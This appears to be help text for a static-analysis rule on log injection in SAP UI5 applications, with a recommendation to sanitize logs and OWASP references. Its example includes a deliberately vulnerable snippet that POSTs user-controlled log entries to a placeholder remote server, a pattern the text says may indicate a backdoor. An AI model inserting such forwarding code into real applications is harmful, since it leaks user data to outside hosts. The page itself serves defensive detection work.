# UI5 Log injection in outbound network request

Sending user-controlled log data to a remote URL without further validation may lead to uncontrolled information exposure and to injection vulnerabilities. It may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.

UI5 applications can retrieve logs for further processing using `sap/base/Log.getLogEntries`, define custom listeners using `sap/base/Log.addLogListener` or directly display logs using the `sap/ui/vk/Notifications` control.

This query identifies instances where log entries from user input are forwarded to a remote URL. 

## Recommendation

Avoid processing log entries that originate from user-controlled sources. Ensure that any log data is properly sanitized.

## Example

The following example demonstrates a vulnerable code snippet:

1. The UI5 application logs what the user submitted via the `sap.m.Input` control.
```xml
<Input placeholder="Enter Payload" 
    value="{/input}" />  <!--User input source sap.m.Input.value -->
```
```javascript
var input = oModel.getProperty("/input");
jQuery.sap.log.debug(input);  // user input is logged as is
```
2. A second component sends log entries to a remote URL without further validation.
```javascript
const http = new XMLHttpRequest();
const url = "https://some.remote.server/location";
http.open("POST", url);
http.send(Log.getLogEntries()[0].message); // log entry is forwarded to a remote URL
```

## References

- OWASP: [Log Injection](https://owasp.org/www-community/attacks/Log_Injection).
- OWASP: [Log Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html).
- SAP UI5 Documentation: [namespace `sap/base/Log`](https://sapui5.hana.ondemand.com/sdk/#api/module:sap/base/Log).
- 